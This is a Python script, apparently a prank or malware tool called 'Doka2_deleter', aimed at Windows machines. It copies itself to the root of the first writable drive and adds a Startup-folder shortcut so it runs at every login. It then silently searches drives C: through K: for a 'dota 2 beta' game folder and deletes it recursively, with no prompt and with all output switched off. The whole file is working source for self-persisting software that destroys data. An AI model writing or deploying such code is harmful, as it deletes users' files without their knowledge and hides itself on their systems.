import winreg as reg
import os
import shutil
import winshell
import win32com.client

path = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/', 'K:/']
to_find = "dota 2 beta"
found_steamapps = False
found = False
develop_mode = False # enables 'printer' function
res = []

def printer(msg):
    if develop_mode == True:
        print(msg)

" Lets find 'to_find' folder"
def lets_go():
    global found
    global found_steamapps
    global res
    for where_find in path:
        printer("Start find in label " + where_find)
        found = False
        found_steamapps = False
        for dirs, folder, files in os.walk(where_find):
            if found == True  or found_steamapps == True:
                printer("stopping steamapps = " + str(found_steamapps))
                break
            for fol in folder:
                if (fol == to_find):
                    found = True
                    printer("Found " + dirs + " *pow*pow*pow*")
                    res.append(dirs)
                    break
                if (fol == "steamapps"):
                    printer("Found steamapps")
                    found_steamapps = True
                    find_file(dirs)
                    break 
        if found == True or found_steamapps == True:
            printer("stopping steamapps = " + str(found_steamapps))
            break
    return res

def find_file(cur_dir):
    global found
    global found_steamapps
    global res
    for dirs, folder, files in os.walk(cur_dir):
        if found == True:
            break
        for fol in folder:
            if (fol == to_find):
                found = True
                printer("Found " + dirs + " *pow*pow*pow*")
                res.append(dirs)
                break

" Deletes 'to_find' folder in 'path' path, geniously"
def delet_dis(path):
    printer("Preparing to delele from folder " + path)
    to_del = os.path.join(os.path.abspath(path), to_find)
    printer("to_del = " + str(to_del))
    shutil.rmtree(to_del)

" Adds this programm to autostart"
def addToRegistry():
    printer("copying file")
    for entry in path:
        if not os.path.exists(str(entry) + "\Doka2_deleter.exe"):
            try:
                shutil.copy2('.\Doka2_deleter.exe', str(entry) + "\Doka2_deleter.exe")
                startup = winshell.startup()
                printer(startup)
                ws = win32com.client.Dispatch("wscript.shell")
                scut = ws.CreateShortcut(startup + '\Doka2_deleter.lnk')
                scut.TargetPath = '"' + str(entry) + "\Doka2_deleter.exe" + '"'
                scut.Arguments = ''
                scut.Save()
                printer("Added to registry")
                break
            except Exception as e:
                pass
        else:
            printer("file exists")
            break
        
addToRegistry()
printer("Test 1 success : RESPECT +++++++++++++")

res = lets_go()

printer("Results:")
i = 1
for entry in res:
    printer(str(i) + " " + entry)
    i = i + 1
if (len(res) > 0):
    printer("Test 2 success : RESPECT +++++++++++++")
    for entry in res:
        delet_dis(entry)
    printer("Test 3 success : RESPECT +++++++++++++")
else:
    printer("tofind - " + to_find + " not found\n" + "found steamapps = " + str(found_steamapps))



        